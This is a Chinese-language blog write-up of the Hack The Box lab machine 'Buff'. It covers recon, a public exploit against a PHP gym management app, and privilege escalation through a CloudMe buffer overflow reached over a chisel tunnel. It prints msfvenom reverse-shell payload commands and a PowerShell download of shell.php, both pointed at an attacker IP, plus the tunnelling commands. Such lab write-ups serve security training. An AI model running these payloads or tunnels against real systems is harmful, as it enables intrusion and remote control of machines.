---
title: Buff (Hack The Box Writeup)
date: 2021-09-23T13:48:00+08:00
draft: false
url: "/2021/09/23/buff-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/263
- IP : 10.129.2.18

## Recon

- 掃 Port![](/uploads/2022/02/93c09-yL8iY6M.png)掃目錄- ![](/uploads/2022/02/1a439-Y7oU0b5.png)
- `/Readme.md`![](/uploads/2022/02/957f0-WmFd25G.png)觀察首頁- ![](/uploads/2022/02/c2bd0-bzW40SX.png)
- ![](/uploads/2022/02/e9918-SLSkSSK.png)SQL 檔案
- ![](/uploads/2022/02/b7805-9ocQOrC.png)找到專案 Project- https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/
- ![](/uploads/2022/02/abb57-yUMlONu.png)
- ![](/uploads/2022/02/ecbf3-LvcGkGa.png)預設密碼，登入失敗試用 Exploit- ![](/uploads/2022/02/bcf62-lpfFpjB.png)準備另外一個 reverse shell- ![](/uploads/2022/02/74c86-ffRLY8D.png)確認 Systeminfo- ![](/uploads/2022/02/6ef33-Z9CEOFQ.png)取 Userflag- ![](/uploads/2022/02/4ed09-9AWNGuu.png)
- ![](/uploads/2022/02/337ac-q33pwEX.png)

## 提權

- 確認 Defender 有開![](/uploads/2022/02/aab93-FFttCr6.png)產 Shell- `msfvenom -p php/reverse_php LHOST=10.10.16.35 LPORT=7877 -f raw > shell.php`
- `powershell -c "wget http://10.10.16.35/shell.php -outFile shell.php"`亂逛系統- ![](/uploads/2022/02/652f1-fW23r7Q.png)觀察開的 Port- `netstat -ano -p tcp`
- ![](/uploads/2022/02/4c224-Cm2GtjU.png)觀察執行中的 Process- `tasklist`
- ![](/uploads/2022/02/b19e1-FmIgOk3.png)發現 Downloads 資料夾有 `CloudMe_1122.exe`- ![](/uploads/2022/02/6fbb2-IxszMnz.png)
- ![](/uploads/2022/02/84b4c-yZ8055X.png)觀察開的 Port- ![](/uploads/2022/02/bad17-XuKH90a.png)
- 8888 但他只綁 127.0.0.1

## Exploit

- 本地端執行`./chisel server -p 9999 --reverse`遠端執行- `chisel.exe client 10.10.16.35:9999 R:8888:127.0.0.1:8888`
- 把 Port 轉回 127.0.0.1:8888收封包- ![](/uploads/2022/02/aa711-7j9ouzo.png)使用 Exploit- https://www.exploit-db.com/exploits/48389修改 shell code- `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.35 LPORT=4444 EXITFUNC=thread -b "\x00\x0d\x0a" -f python`
- ![](/uploads/2022/02/5fcee-42hWoXQ.png)收 Reverse shell- ![](/uploads/2022/02/29252-7FdFbwy.png)取得 Root flag- ![](/uploads/2022/02/c4b3d-xJEo9ey.png)
